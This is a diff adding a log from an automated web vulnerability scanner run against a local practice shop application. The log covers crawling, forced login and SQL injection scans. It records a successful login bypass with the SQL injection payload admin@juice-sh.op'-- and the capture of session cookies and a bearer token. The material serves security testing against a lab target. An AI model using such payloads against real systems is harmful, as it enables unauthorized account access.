@@ -1,0 +1,92 @@
+16:57:31 [INFO] ============================================================
+16:57:31 [INFO] [PHASE 1] CHECKING TARGET REACHABILITY
+16:57:31 [INFO] ============================================================
+16:57:31 [INFO] 🔍 Testing connectivity to http://localhost:4040/...
+16:57:31 [INFO] ✅ Target is reachable! (Status: 200)
+16:57:31 [INFO] [+] Starting Public Discovery...
+16:57:31 [INFO] 🚀 Starting Async Crawl: http://localhost:4040/
+16:57:34 [INFO]     [+] Target Saved: GET http://localhost:4040/assets/i18n/en.json
+16:57:34 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/admin/application-version
+16:57:34 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/admin/application-configuration
+16:57:34 [INFO]     [+] Target Saved: GET http://localhost:4040/api/Challenges/?name=Score%20Board
+16:57:34 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/languages
+16:57:34 [INFO]     [+] Target Saved: GET http://localhost:4040/api/Quantitys/
+16:57:34 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/products/search?q=
+16:57:37 [INFO]     [..] Executing behavioral exploration...
+16:57:47 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/user/whoami
+16:57:47 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/products/24/reviews
+16:57:48 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/products/6/reviews
+16:57:49 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/products/42/reviews
+16:57:51 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/products/30/reviews
+16:57:52 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/products/3/reviews
+16:57:53 [INFO]     [+] Target Saved: GET http://localhost:4040/
+16:57:54 [INFO] ============================================================
+16:57:54 [INFO] [PHASE 2] AUTHENTICATION / FORCED LOGIN
+16:57:54 [INFO] ============================================================
+16:57:55 [INFO] 🌐 Loading target page: http://localhost:4040/
+16:57:58 [INFO] ✅ Page loaded successfully
+16:57:58 [INFO] 🕵️ No login form on landing page, searching for entry...
+16:57:58 [INFO] Trying login path: /login
+16:57:59 [INFO] Trying login path: /signin
+16:58:00 [INFO] Trying login path: /#/login
+16:58:02 [INFO] ✅ Found login form at http://localhost:4040/#/login
+16:58:02 [INFO] 🔨 Attempting aggressive login (SQLi bypass, default creds)...
+16:58:02 [INFO] [Auth] 🛡️ Attempting Aggressive Entry at http://localhost:4040/#/login
+16:58:04 [INFO] ✅ SQLi Bypass Success with payload: admin@juice-sh.op'--
+16:58:04 [INFO] ✅ Aggressive login successful!
+16:58:04 [INFO] 🍪 Captured 4 session cookies
+16:58:04 [INFO] [ScanEngine] 🚩 Found 1 authentication findings.
+16:58:04 [INFO] [Crawler] 🍪 External cookies set. Total: 5
+16:58:04 [INFO] [PHASE 3] DEEP CRAWLING WITH SESSION...
+16:58:04 [INFO] 🚀 Starting Async Crawl: http://localhost:4040/
+16:58:05 [INFO] [Crawler] 🍪 Context initialized with 5 cookies
+16:58:09 [INFO]     [..] Executing behavioral exploration...
+16:58:16 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/products/1/reviews
+16:58:23 [INFO] [Requester] 💉 Header set: Authorization
+16:58:23 [INFO] [ScanEngine] 🔑 Bearer Token Injected for Phase 4
+16:58:23 [INFO] ============================================================
+16:58:23 [INFO] [PHASE 4] ATTACK / EXPLOITATION
+16:58:23 [INFO] ============================================================
+16:58:23 [INFO] 📊 Deduplication: 30 -> 15 unique targets
+16:58:23 [INFO] [ScanEngine] Syncing session state to scanners...
+16:58:23 [INFO] [Requester] 🍪 Cookies injected from dictionary.
+16:58:23 [INFO] 🔓 Running SQL Injection scans on 15 endpoints...
+16:58:23 [INFO] [1/15] SQLi Scan: GET http://localhost:4040/assets/i18n/en.json
+16:58:23 [INFO] [SQLi] Scan: GET http://localhost:4040/assets/i18n/en.json
+16:58:23 [INFO] [2/15] SQLi Scan: GET http://localhost:4040/rest/admin/application-version
+16:58:23 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/admin/application-version
+16:58:23 [INFO] [3/15] SQLi Scan: GET http://localhost:4040/rest/admin/application-configuration
+16:58:23 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/admin/application-configuration
+16:58:23 [INFO] [4/15] SQLi Scan: GET http://localhost:4040/api/Challenges/?name=Score%20Board
+16:58:23 [INFO] [SQLi] Scan: GET http://localhost:4040/api/Challenges/?name=Score%20Board
+16:58:23 [INFO]     -> Testing Parameter: name
+16:58:28 [INFO] [5/15] SQLi Scan: GET http://localhost:4040/rest/languages
+16:58:28 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/languages
+16:58:28 [INFO] [6/15] SQLi Scan: GET http://localhost:4040/api/Quantitys/
+16:58:28 [INFO] [SQLi] Scan: GET http://localhost:4040/api/Quantitys/
+16:58:28 [INFO] [7/15] SQLi Scan: GET http://localhost:4040/rest/products/search?q=
+16:58:28 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/products/search?q=
+16:58:28 [INFO]     -> Testing Parameter: q
+16:58:32 [INFO] [8/15] SQLi Scan: GET http://localhost:4040/rest/user/whoami
+16:58:32 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/user/whoami
+16:58:32 [INFO] [9/15] SQLi Scan: GET http://localhost:4040/rest/products/24/reviews
+16:58:32 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/products/24/reviews
+16:58:32 [INFO]     -> Testing Parameter: path_id_3
+16:58:33 [INFO] [10/15] SQLi Scan: GET http://localhost:4040/rest/products/6/reviews
+16:58:33 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/products/6/reviews
+16:58:33 [INFO]     -> Testing Parameter: path_id_3
+16:58:35 [INFO] [11/15] SQLi Scan: GET http://localhost:4040/rest/products/42/reviews
+16:58:35 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/products/42/reviews
+16:58:35 [INFO]     -> Testing Parameter: path_id_3
+16:58:37 [INFO] [12/15] SQLi Scan: GET http://localhost:4040/rest/products/30/reviews
+16:58:37 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/products/30/reviews
+16:58:37 [INFO]     -> Testing Parameter: path_id_3
+16:58:39 [INFO] [13/15] SQLi Scan: GET http://localhost:4040/rest/products/3/reviews
+16:58:39 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/products/3/reviews
+16:58:39 [INFO]     -> Testing Parameter: path_id_3
+16:58:40 [INFO] [14/15] SQLi Scan: GET http://localhost:4040/
+16:58:40 [INFO] [SQLi] Scan: GET http://localhost:4040/
+16:58:40 [INFO] [15/15] SQLi Scan: GET http://localhost:4040/rest/products/1/reviews
+16:58:40 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/products/1/reviews
+16:58:40 [INFO]     -> Testing Parameter: path_id_3
+16:58:42 [INFO] ✅ No vulnerabilities found
